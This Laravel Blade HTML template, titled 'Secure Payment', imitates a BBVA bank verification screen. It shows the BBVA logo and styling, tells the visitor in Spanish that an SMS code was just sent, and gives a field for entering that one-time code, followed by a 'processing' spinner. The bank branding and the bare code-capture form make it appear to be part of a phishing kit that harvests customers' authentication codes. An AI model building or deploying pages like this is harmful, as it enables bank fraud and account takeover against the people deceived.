<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    
    <title>Secure Payment</title>


    <link rel="stylesheet" href="{{asset('assets/css/payment/bbva.css')}}">


    <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>

    <style>
    .spinner-container {
      margin-bottom: 2rem;
    }

    .spinner {
        width: 60px;
        height: 60px;
        border: 4px solid rgba(232, 17, 75, 0.2);
        border-left: 4px solid rgb(232, 17, 75);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 3rem;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    </style>
</head>
<body>
    <div id="formContainer" class="details">
        <img src="{{asset('assets/img/payment/bbva/bbva.webp')}}" alt="" width="130px">
        <hr>
        <br>
        <h3 style="color:black;">Vamos a validar tu compra</h3>
        <a style="color:black;">Ingresa el código SMS que te acabamos de enviar y dale "Confirmar".</a><br><p></p>
    
        
        <div style="text-align: center;">
            <a style="">Código de verificación</a>
            <br>
            <input type="tel" class="otp" name="cDinamica" id="txtOTP" style="" required maxlength="8" minlength="6" oninput="this.value = this.value.replace(/\D+/g, '');" required><br>
            <input type="submit" class="otp" id="btnOTP" value="ENVIAR" style="color:white; background-color:blue; border:none;margin-top:5px; height:35px; width:85%;">
        </div>
        <br>
        <br>
        <div><a><b>REENVIAR CÓDIGO</b></a></div>
        <br>
        <a><b>Ayuda</b></a>
    </div>

    <div id="loader" class="spinner-container" style="display:none; text-align:center; margin-top:50%;">
        <div class="spinner"></div>
        <p style="color:#333; margin-top:15px;">Procesando, por favor espera...</p>
    </div>

</body>

</html>